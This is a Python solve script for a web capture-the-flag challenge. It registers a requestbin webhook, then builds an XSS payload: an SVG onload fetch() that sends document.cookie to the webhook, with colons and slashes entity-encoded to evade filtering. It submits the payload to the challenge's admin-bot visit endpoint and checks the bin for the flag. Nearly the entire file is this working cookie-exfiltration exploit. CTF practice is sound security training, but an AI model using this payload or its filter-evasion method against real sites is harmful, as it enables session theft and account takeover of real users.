import base64
import json
import requests
import sys
import urllib.parse

CHAL_URL = 'https://wsc-2022-web-5-bvel4oasra-uc.a.run.app/'
FLAG_PREFIX = 'wsc{'

def getHookUrls():
    url = 'https://requestbin.net/api/v1/bins'
    response = requests.post(url)
    if response.status_code != 200:
        print('Error in ', url, response.status_code, response.text)
        sys.exit(1)

    data = json.loads(response.text)
    name = data['name']
    hookUrl = f'https://requestbin.net/r/{name}/'
    readUrl = f'https://requestbin.net/r/{name}/?inspect'
    return (hookUrl, readUrl)

def solve():
    (hookUrl, readUrl) = getHookUrls()
    # print('hookUrl', hookUrl)
    # print('readUrl', readUrl)

    encodedHookUrl = hookUrl
    encodedHookUrl = encodedHookUrl.replace(':', '&colon;')
    encodedHookUrl = encodedHookUrl.replace('/', '&sol;')
    # print('encodedUrl', encodedHookUrl)

    xssUrl = f'http://<svg%0conload=fetch("{encodedHookUrl}"+document.cookie)>/wow'
    # print('xssUrl', xssUrl)
    urlToSubmit = CHAL_URL + 'visit?url=' + urllib.parse.quote(xssUrl)

    url = CHAL_URL + 'visit?url=' + urllib.parse.quote(urlToSubmit)

    response = requests.get(url)
    if response.status_code != 200:
        print(url, response.status_code, response.text)
        sys.exit(1)

    if 'Our admin bot has visited your URL!' not in response.text:
        print(url, response.status_code, response.text)
        sys.exit(1)

    hookResponse = requests.get(readUrl)

    if hookResponse.status_code != 200:
        print(url, hookResponse.status_code)
        sys.exit(1)

    if FLAG_PREFIX in hookResponse.text:
        print('solved')
    else:
        print('Error: flag not found in hookResponse.text')
        sys.exit(1)


solve()
